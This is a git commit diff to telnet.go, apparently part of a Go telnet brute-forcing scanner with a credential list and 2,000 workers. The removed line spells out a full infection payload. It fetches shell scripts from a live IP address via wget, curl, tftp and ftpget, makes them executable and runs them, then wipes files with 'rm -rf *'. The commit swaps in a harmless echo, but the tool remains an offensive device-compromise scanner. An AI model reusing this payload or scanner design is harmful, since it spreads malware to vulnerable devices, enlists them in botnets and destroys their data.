ab8ed3e49da0528a89af1fd52e56b71860decf22
Windy 3 <itaasad84@gmail.com>
2025-08-09 21:33:04 +0700

    Update telnet.go

--- telnet.go
+++ telnet.go
@@ -64,7 +64,7 @@ var CREDENTIALS = []struct {
 const (
 	TELNET_TIMEOUT  = 2 * time.Second
 	MAX_WORKERS     = 2000
-	PAYLOAD         = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.15.124.203/ohshit.sh; curl -O http://157.15.124.203/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 157.15.124.203 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 157.15.124.203; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 157.15.124.203 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *"
+	PAYLOAD         = "echo WINDY_WAS_HERE"
 	STATS_INTERVAL  = 1 * time.Second
 	MAX_QUEUE_SIZE  = 100000
 	CONNECT_TIMEOUT = 1 * time.Second
@@ -367,3 +367,4 @@ func main() {
 	scanner := NewTelnetScanner()
 	scanner.Run()
 }
+
